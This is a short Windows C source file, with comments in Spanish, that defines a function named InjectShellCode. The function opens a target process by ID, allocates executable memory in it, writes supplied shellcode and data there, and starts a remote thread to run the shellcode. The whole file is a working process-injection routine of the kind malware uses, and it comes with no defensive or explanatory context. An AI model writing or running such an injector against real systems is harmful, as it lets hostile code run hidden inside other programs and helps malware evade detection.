#include "shellcode.h"


DWORD InjectShellCode(DWORD pid, LPVOID lpshell, DWORD shellsize, LPVOID lpdata, DWORD datasize)
{
HANDLE hProc;
LPVOID remoteBase;
BOOL bProc=FALSE;
DWORD aux;

// ANTES DE TODO, ABRIR PROCESO
hProc=OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
if(!hProc) return GetLastError();  //printf("No se pudo abrir proceso %p", pid);

// RESERVAR MEMORIA EN EL ESPACIO DE DIRECCIONES DEL PROCESO
remoteBase=VirtualAllocEx(hProc, NULL, shellsize+datasize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if(remoteBase==NULL) return GetLastError();

// INYECTAR CODIGO
bProc=WriteProcessMemory(hProc, remoteBase, lpshell, shellsize, &aux);
if(!bProc) return GetLastError(); //printf("EXITO AL ESCRIBIR");

// INYECTAR DATOS
bProc=WriteProcessMemory(hProc, (LPVOID)((DWORD)remoteBase+shellsize), lpdata, datasize, &aux);
if(!bProc) return GetLastError(); //printf("EXITO AL ESCRIBIR");

// CREAR THREAD EN hProc, COMENZANDO EN LA DIRECCION remoteBase DE SU ESPACIO DE DIRECCIONES
hProc=CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) remoteBase, (LPVOID)((DWORD)remoteBase+shellsize), 0, NULL);
if(hProc==NULL) return GetLastError();  //printf("No se pudo abrir proceso %p", pid);


return 0;
}



